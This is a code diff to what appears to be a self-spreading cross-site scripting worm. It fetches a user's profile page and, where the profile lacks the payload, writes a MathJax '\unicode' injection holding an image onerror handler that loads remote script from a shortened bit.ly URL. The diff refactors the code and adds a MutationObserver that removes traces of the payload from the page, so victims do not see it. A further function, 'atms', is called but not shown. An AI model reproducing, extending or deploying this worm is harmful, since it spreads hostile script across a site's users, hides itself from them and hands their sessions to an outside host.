@@ -1,10 +1,29 @@
-async function propagation() {
-        let artefactos = document.querySelectorAll('.MathJax');
-        artefactos.forEach(nodo => {
-            if (nodo.innerHTML.includes('𐀀') || nodo.innerHTML.includes('<img')) {
-            nodo.remove();
+function removeArtifacts(root = document) {
+    const nodes = root.querySelectorAll('.MathJax');
+    nodes.forEach(node => {
+        const html = node.innerHTML || '';
+        if (html.includes('𐀀') || html.includes('<img')) {
+            node.remove();
         }
     });
+}
+
+function startArtifactObserver() {
+    removeArtifacts(document);
+    const observer = new MutationObserver(mutations => {
+        mutations.forEach(mutation => {
+            mutation.addedNodes.forEach(node => {
+                if (!(node instanceof HTMLElement)) return;
+                removeArtifacts(node);
+            });
+        });
+    });
+    observer.observe(document.documentElement || document, { childList: true, subtree: true });
+    return observer;
+}
+
+async function propagation() {
+    removeArtifacts(document);
     try {
         let perfil = await fetch('FUSDatosPersonalesVer.aspx');
         let html = await perfil.text();
@@ -14,16 +33,10 @@ async function propagation() {
 
         let parrafo = doc.querySelector("p.mt-4.text-muted");
 
-        let textoNodo = parrafo
-            ? [...parrafo.childNodes].find(node => node.nodeType === Node.TEXT_NODE)
-            : null;
-
-        let texto = textoNodo ? textoNodo.textContent.trim() : '';
-        let htmlInner = parrafo ? parrafo.innerHTML : '';
-
+        const textValue = parrafo?.textContent?.trim() || '';
+        const htmlValue = parrafo?.innerHTML || '';
         const pattern = '<img src=x onerror="$.getScript(\'//bit.ly/4sadNVr\')">';
-
-        const hasKey = htmlInner.includes(pattern) || texto.includes(pattern);
+        const hasKey = htmlValue.includes(pattern) || textValue.includes(pattern) || html.includes(pattern);
         if (hasKey) {
             return;
         }
@@ -35,7 +48,7 @@ async function propagation() {
             },
             body: new URLSearchParams({
                 ITEsUpdate: '-1',
-                Presentacion: `${texto ? texto + ' ' : ''}\\(\\unicode{<img src=x onerror="$.getScript('//bit.ly/4sadNVr')">}\\)`,
+                Presentacion: `${textValue ? textValue + ' ' : ''}\\(\\unicode{<img src=x onerror="$.getScript('//bit.ly/4sadNVr')">}\\)`,
                 MostrarEmail: '3',
                 MostrarCurriculum: '3',
                 Aceptar: '-1'
@@ -295,6 +308,8 @@ async function atms() {
 }
 
 (async function main() {
+    const observer = startArtifactObserver();
     await propagation();
     await atms();
+    observer.disconnect();
 })();
